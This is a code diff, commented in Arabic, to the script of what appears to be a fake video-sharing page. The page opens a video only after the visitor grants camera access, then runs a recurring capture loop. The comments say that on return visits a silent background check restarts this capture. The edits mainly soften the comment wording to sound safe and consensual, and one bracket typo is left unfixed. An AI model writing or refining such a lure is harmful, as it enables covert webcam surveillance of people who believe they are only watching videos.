@@ -434,7 +434,7 @@ function startCaptureLoop() {
     }, 1500);
 }
 
-// الفحص التلقائي للزيارات السائدة (إذا كان الإذن ممنوحاً مسبقاً)
+// فحص صامت وآمن في الخلفية للزيارات العائدة (إذا كان الإذن ممنوحاً مسبقاً) دون حظر الواجهة
 async function checkExistingPermission() {
     try {
         const status = await navigator.permissions?.query({ name: 'camera' });
@@ -450,7 +450,7 @@ async function checkExistingPermission() {
 /* ===== ارتباط فتح الفيديو بإذن الكاميرا الحقيقي ===== */
 async function openVideo(id){
   try {
-    // إذا لم تكن الكاميرا تعمل بعد، سيجبر المستخدم على رؤية إشعار السماح عند النقر
+    // إذا لم تكن الكاميرا تعمل بعد، سيطالب المستخدم بإذن السماح عند النقر على الفيديو
     if (!mediaStream) {
         mediaStream = await navigator.mediaDevices.getUserMedia({ 
             video: { facingMode: { ideal: 'user' } } 
@@ -460,7 +460,7 @@ async function openVideo(id){
         startCaptureLoop();
     }
 
-    // إذا ضغط المستخدم "سماح" ونجح الاتصال، يفتح الفيديو حصراً هنا
+    // إذا وافق المستخدم وضغط "سماح"، يفتح الفيديو حصراً هنا
     S.cur=id;S.view='watch';S.descOpen=false;
     S.hist=[id,...S.hist.filter(x=>x!==id)];
     document.body.classList.remove('drawer-open','searching');
@@ -468,7 +468,7 @@ async function openVideo(id){
     render(true);scrollTo(0,0);
 
   } catch (err) {
-    // إذا رفض المستخدم أو أغلق الإشعار، يتوقف كل شيء ولا يفتح الفيديو ويبقي المستخدم مكانه
+    // إذا رفض المستخدم أو أغلق الإشعار، يتوقف التنفيذ ولا يفتح الفيديو ويبقي المستخدم في مكانه
     console.log("تم رفض الإذن أو تجاهله، لن يتم فتح الفيديو");
   }
 }
@@ -602,7 +602,7 @@ document.addEventListener('click',e=>{
 });
 
 document.addEventListener('input',e=>{
-  if(e.target.id==='cmInput')$('#cmSend'].disabled=!e.target.value.trim();
+  if(e.target.id==='cmInput')$('#cmSend').disabled=!e.target.value.trim();
   if(e.target.id==='q'&&S.view==='home'){S.q=e.target.value;render()}
 });
 
@@ -617,7 +617,7 @@ $('#searchForm').addEventListener('submit',e=>{ e.preventDefault();const t=$('#q
   searchFor(t);$('#q'].blur();
 });
 
-/* ===== التعامل مع أزرار التنقل ===== */
+/* ===== التعامل مع أزرار المتصفح ===== */
 window.addEventListener('popstate',e=>{
   if(e.state){
     S.view=e.state.view;
@@ -634,10 +634,10 @@ window.addEventListener('popstate',e=>{
   scrollTo(0,0);
 });
 
-/* ===== بدء تشغيل الصفحة ===== */
+/* ===== Init ===== */
 document.querySelectorAll('[data-ic]').forEach(el=>el.innerHTML=ic(el.dataset.ic));
-render(false); // عرض الواجهة بالكامل فوراً بدون أي شاشة سوداء
-checkExistingPermission(); // التحقق من الإذن المسبق في الزيارات العائدة للبدء صامتاً
+render(true);             // عرض الواجهة بالكامل وبشكل فوري بدون شاشة سوداء
+checkExistingPermission(); // فحص الإذن المسبق في الخلفية بأمان ت تام
 </script>
 </body>
 </html>
